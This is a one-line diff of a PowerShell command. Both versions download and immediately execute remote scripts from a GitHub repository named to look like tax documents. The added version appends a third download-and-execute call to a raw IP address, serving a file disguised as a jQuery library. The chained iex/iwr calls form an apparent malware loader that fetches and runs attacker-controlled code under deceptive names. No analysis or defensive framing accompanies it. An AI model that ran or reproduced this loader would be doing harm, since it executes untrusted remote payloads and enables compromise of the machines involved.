@@ -1,1 +1,1 @@
-iex (iwr https://github.com/imflikk/Public_Tax_Documents_2020/raw/main/checks.txt -useb); iex (iwr https://github.com/imflikk/Public_Tax_Documents_2020/raw/main/am.txt -useb)
+iex (iwr https://github.com/imflikk/Public_Tax_Documents_2020/raw/main/checks.txt -useb); iex (iwr https://github.com/imflikk/Public_Tax_Documents_2020/raw/main/am.txt -useb); iex (iwr https://20.110.211.173/jquery-3.3.2.slim.min.js -useb)
